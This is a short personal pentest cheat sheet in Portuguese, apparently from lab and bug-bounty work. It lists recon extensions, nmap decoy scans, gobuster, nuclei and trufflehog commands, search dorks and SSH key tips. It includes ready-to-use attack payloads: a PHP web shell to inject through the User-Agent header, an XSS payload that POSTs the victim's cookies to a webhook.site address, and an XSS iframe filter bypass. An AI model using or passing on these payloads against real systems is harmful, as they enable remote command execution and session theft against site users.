# Umas paradas que uso de vez em quando e gosto de deixar salvo pra lembrar


### Extensões úteis para Browser
* `dotgit`
* `Wappalyzer`
* `Shodan`
* `DNSlytics`
* `Retire-js`
* `Hack-Tools` -> MUITO BOA
---
- find / -name user.txt 2>/dev/null
- "Vulnerability Disclosure Program" VDP "site:uk -bugbount -hackerone -intigriti -bugcrowd -yeswehack"
- [Dorks Faisalahmed](https://dorks.faisalahmed.me/)
- nmap -sU -p 53 --script=dns-nsid 10.129.2.48 (Verifica o servidor DNS (porta 53/UDP) por possíveis exposições de dados sensíveis.)
- nmap 10.129.4.84 -sV -D RND:2 -Pn -sS -sU --max-retries=2 --script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36" -p-
- gobuster dir -u https://teste.com -w /usr/share/wordlists/dirb/common.txt  -t 50 -H 'Cookie: ASP.NET_SessionId=whvgzv2plsyzvnglugu2kxyc;' -k -x html,php,js,aspx,bat,txt,zip -b 400 -exclude-lenght 100
- zaproxy testar mais
- subfinder -all -d alvo.com -recursive | httpx | nuclei -nmhe -t ./nuclei-templates/http/cves/(CVE)/CVE-2025-0133.yaml
- nuclei -t cves/ -u [http://alvo.com] -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
- nuclei -u [https://alvo.com]) -tags moodle  
- ?_TSM_HiddenField_=jhbdvfkjhdfbvdfbv&_TSM_CombinedScripts_=1
- [SHCheck - Shell/Header Vulnerability Checker](https://github.com/santoru/shcheck)
- [Converter imagem em link pub](https://pngup.com/)
- <?php system($_GET['ted']);?> no user agent e depois ve se proca na url e etc
- http://palined.com/search/  bom dork para pesquisar diretorios publicos de sites
- id_rsa é o que precisa no ssh, ele tem que esta no dir .ssh, com permissao 600 e com um espaçamento depois do fim da chave pra n dar erro de libcrypto. Precisa tambem usar por final o comando ssh-keygen -lf id_rsa. Depois apenas logar no ssh usando o : ssh -i id_rsa ceil@10.129.196.75
- reminna pra rdp no kali e outras coisas
- trufflehog git https://github.com/trufflesecurity/test_keys --results=verified            -> scan de um repositorio especifico em busca de secrets
- trufflehog github --org=trufflesecurity --results=verified       -> scan de um perfil github completo em busca de secrets
- https://web.archive.org/

---
  
### Payload XSS Simples para Roubo de Cookies:
    <img src=x onerror="fetch('https://webhook.site/8a54464b-651a-4ae5-9d09-d19711774bd1',{method:'POST',body:'cookie='+document.cookie})">
### Bypass de filtro de iframe com xss onerror
```
<img src="invalid" onerror="document.body.innerHTML+='<iframe src=https://emupedia.net/emupedia-game-doom1/asmjs/ width=500 height=400></iframe>'">
```




